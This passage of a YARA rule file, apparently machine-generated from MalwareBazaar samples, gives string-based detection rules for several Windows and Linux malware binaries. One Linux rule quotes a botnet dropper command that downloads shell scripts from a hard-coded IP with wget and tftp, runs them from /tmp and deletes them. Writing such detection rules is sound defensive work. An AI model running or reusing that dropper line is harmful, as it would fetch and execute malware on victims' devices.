        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB and
        all of them
}

rule Linux_02b54e35d0385151a64d59d294017f8030c22b4e7ef1c457e49388af9babd896
{
    meta:
        description = "Auto ML: 02b54e35d0385151a64d59d294017f8030c22b4e7ef1c457e49388af9babd896"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Windows_25533568bd447e6b298d644fe78779096102bd5d4ad35d5ae2116c316b63ebb1
{
    meta:
        description = "Auto ML: 25533568bd447e6b298d644fe78779096102bd5d4ad35d5ae2116c316b63ebb1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "B.rsrc"
        $s6 = "D$Awine"
        $s7 = "9fileu"
        $s8 = "9file"
        $s9 = "9windu"
        $s10 = "windu'f"
        $s11 = "open"
        $s12 = ";fileua"
        $s13 = ">fileu"
        $s14 = "8fileu#"
        $s15 = ":httpu"
        $s16 = ":httpuO"
        $s17 = ">http"
        $s18 = ">httpu"
        $s19 = "httpu\""
        $s20 = "HTTPu*"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 23395KB and
        all of them
}

rule Windows_2566feced03a4f1af9907d884e058cd6ec115a9b934a720851d063dbdea3ae9f
{
    meta:
        description = "Auto ML: 2566feced03a4f1af9907d884e058cd6ec115a9b934a720851d063dbdea3ae9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_2573875eb640d30e444267c83205418a14053dfb046782e3e36defec71cba8b5
{
    meta:
        description = "Auto ML: 2573875eb640d30e444267c83205418a14053dfb046782e3e36defec71cba8b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "AreFileApisANSI"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = ".text$mn"
        $s16 = ".text$x"
        $s17 = ".rdata"
        $s18 = ".rdata$r"
        $s19 = ".rdata$sxdata"
        $s20 = ".rdata$voltmd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 716KB and
        all of them
}

rule Linux_2588a07da2183878ad2a2b37fc29bce49fe497e1ab59c3dd5cc80538ea0a4d84
{
    meta:
        description = "Auto ML: 2588a07da2183878ad2a2b37fc29bce49fe497e1ab59c3dd5cc80538ea0a4d84"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB and
        all of them
}

rule Windows_25a9de96069391e57c0bf588996be23f79094b389baa0d6479727b258b3c1753
{
    meta:
        description = "Auto ML: 25a9de96069391e57c0bf588996be23f79094b389baa0d6479727b258b3c1753"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "AES for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s7 = "SHA1 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s8 = "Montgomery Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s9 = "Camellia for x86 by <appro@openssl.org>"
        $s10 = "RC4 for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s11 = "SHA256 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s12 = "SHA512 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s13 = "GHASH for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s14 = "Copyright (C) 2016 and later: Unicode, Inc. and others. License & terms of use: http://www.unicode.org/copyright.html"
        $s15 = "icudt60l/numberingSystems.res"
        $s16 = "icudt60l/windowsZones.res"
        $s17 = "windows"
        $s18 = "ussystem"
        $s19 = "Africa:Windhoek"
        $s20 = "America:Indiana:Winamac"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 29767KB and
        all of them
}

rule Windows_25b36aa737b21d09321370e76dd2540604e24f5a7f0992df779790a1171d08ec
{
    meta:
        description = "Auto ML: 25b36aa737b21d09321370e76dd2540604e24f5a7f0992df779790a1171d08ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1271KB and
        all of them
}
